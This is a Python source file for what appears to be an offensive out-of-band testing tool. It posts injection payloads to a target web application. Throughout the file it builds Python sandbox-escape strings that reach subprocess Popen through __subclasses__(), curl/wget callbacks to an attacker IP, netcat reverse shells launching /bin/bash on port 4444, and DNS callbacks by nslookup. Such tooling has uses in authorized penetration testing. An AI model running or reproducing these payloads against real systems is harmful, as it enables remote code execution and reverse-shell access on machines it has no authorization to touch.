# app/tools/oob_tester.py
import asyncio
import aiohttp
import random
import string
import time
import logging
from urllib.parse import quote, urljoin
from typing import List, Dict, Optional
from app.core.logger import logger

class MultiChannelOOBTester:
    """Multi-channel Out-of-Band testing for sandbox escapes"""
    
    def __init__(self, listener_manager=None):
        self.listener_manager = listener_manager
        self.session = None
        
    async def multi_channel_oob_test(self, target_url: str, attacker_ip: str, 
                                   dns_domain: str = None, dangerous_classes: List = None):
        """
        Launch multi-channel OOB test with HTTP, netcat, and DNS callbacks
        
        Args:
            target_url: Target application URL to send payloads to
            attacker_ip: Attacker's IP for callbacks
            dns_domain: DNS domain for DNS callbacks (e.g., "token.interact.sh")
            dangerous_classes: List of (index, class_name) tuples for Python sandbox
        """
        results = {
            'http_callbacks': [],
            'netcat_callbacks': [],
            'dns_callbacks': [],
            'payloads_sent': 0,
            'success': False
        }
        
        # Generate unique test identifier
        test_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        try:
            connector = aiohttp.TCPConnector(limit=5, limit_per_host=2)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                self.session = session
                
                # 1. HTTP OOB Testing (multiple ports)
                http_results = await self._test_http_oob(session, target_url, attacker_ip, test_id, dangerous_classes)
                results['http_callbacks'].extend(http_results)
                results['payloads_sent'] += len(http_results)
                
                # 2. Netcat OOB Testing
                netcat_results = await self._test_netcat_oob(session, target_url, attacker_ip, test_id, dangerous_classes)
                results['netcat_callbacks'].extend(netcat_results)
                results['payloads_sent'] += len(netcat_results)
                
                # 3. DNS OOB Testing (if domain provided)
                if dns_domain:
                    dns_results = await self._test_dns_oob(session, target_url, dns_domain, test_id, dangerous_classes)
                    results['dns_callbacks'].extend(dns_results)
                    results['payloads_sent'] += len(dns_results)
                
                results['success'] = results['payloads_sent'] > 0
                
        except Exception as e:
            logging.error(f"[OOB] Multi-channel test failed: {e}")
            results['error'] = str(e)
        
        return results
    
    async def _test_http_oob(self, session, target_url: str, attacker_ip: str, 
                           test_id: str, dangerous_classes: List = None) -> List[Dict]:
        """Test HTTP OOB callbacks"""
        results = []
        
        # Use active listener port if available
        callback_url = f"http://{attacker_ip}:4444/sb_{test_id}"
        
        # Targeted payloads based on context
        if dangerous_classes:
            # Python sandbox escape payloads
            for class_idx, class_name in dangerous_classes[:2]:
                if 'Popen' in class_name:
                    payloads = [
                        f"().__class__.__base__.__subclasses__()[{class_idx}](['curl', '{callback_url}'])",
                        f"().__class__.__base__.__subclasses__()[{class_idx}]('curl {callback_url}', shell=True)"
                    ]
                    
                    for payload in payloads:
                        try:
                            for param in ['code', 'input']:
                                await session.post(target_url, data={param: payload}, timeout=3)
                                results.append({'type': 'http', 'payload': payload[:50], 'param': param})
                        except:
                            continue
        else:
            # Generic RCE payloads
            payloads = [f"curl {callback_url}", f"wget {callback_url}"]
            for payload in payloads:
                try:
                    for param in ['cmd', 'exec']:
                        await session.post(target_url, data={param: payload}, timeout=3)
                        results.append({'type': 'http', 'payload': payload, 'param': param})
                except:
                    continue
        
        return results
    
    async def _test_netcat_oob(self, session, target_url: str, attacker_ip: str, 
                             test_id: str, dangerous_classes: List = None) -> List[Dict]:
        """Test netcat OOB callbacks"""
        results = []
        
        # Use active listener port
        port = 4444
        
        if dangerous_classes:
            # Python sandbox netcat escape
            for class_idx, class_name in dangerous_classes[:1]:
                if 'Popen' in class_name:
                    payload = f"().__class__.__base__.__subclasses__()[{class_idx}](['nc', '{attacker_ip}', '{port}', '-e', '/bin/bash'])"
                    try:
                        await session.post(target_url, data={'code': payload}, timeout=3)
                        results.append({'type': 'netcat', 'payload': payload[:50]})
                    except Exception as _exc:
                        pass
                        logger.debug("Suppressed exception", exc_info=True)
        else:
            # Generic netcat
            payload = f"nc {attacker_ip} {port} -e /bin/bash"
            try:
                await session.post(target_url, data={'cmd': payload}, timeout=3)
                results.append({'type': 'netcat', 'payload': payload})
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
        
        return results
    
    async def _test_dns_oob(self, session, target_url: str, dns_domain: str, 
                          test_id: str, dangerous_classes: List = None) -> List[Dict]:
        """Test DNS OOB callbacks"""
        results = []
        
        if dangerous_classes:
            # Python sandbox DNS escape
            for class_idx, class_name in dangerous_classes[:1]:
                if 'Popen' in class_name:
                    payload = f"().__class__.__base__.__subclasses__()[{class_idx}](['nslookup', '{test_id}.{dns_domain}'])"
                    try:
                        await session.post(target_url, data={'code': payload}, timeout=3)
                        results.append({'type': 'dns', 'payload': payload[:50]})
                    except Exception as _exc:
                        pass
                        logger.debug("Suppressed exception", exc_info=True)
        else:
            # Generic DNS
            payload = f"nslookup {test_id}.{dns_domain}"
            try:
                await session.post(target_url, data={'cmd': payload}, timeout=3)
                results.append({'type': 'dns', 'payload': payload})
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
        
        return results

def multi_channel_oob_test(target_url: str, attacker_ip: str, dns_domain: str = None, 
                          dangerous_classes: List = None, listener_manager=None):
    """
    Synchronous wrapper for multi-channel OOB testing
    
    Args:
        target_url: Target application URL
        attacker_ip: Attacker's IP for callbacks  
        dns_domain: DNS domain for DNS callbacks (optional)
        dangerous_classes: List of (index, class_name) tuples for Python sandbox
        listener_manager: Listener manager instance
    """
    tester = MultiChannelOOBTester(listener_manager)
    
    try:
        # Run async test
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        results = loop.run_until_complete(
            tester.multi_channel_oob_test(target_url, attacker_ip, dns_domain, dangerous_classes)
        )
        loop.close()
        return results
    except Exception as e:
        logging.error(f"[OOB] Sync wrapper failed: {e}")
        return {
            'error': str(e),
            'payloads_sent': 0,
            'success': False
        }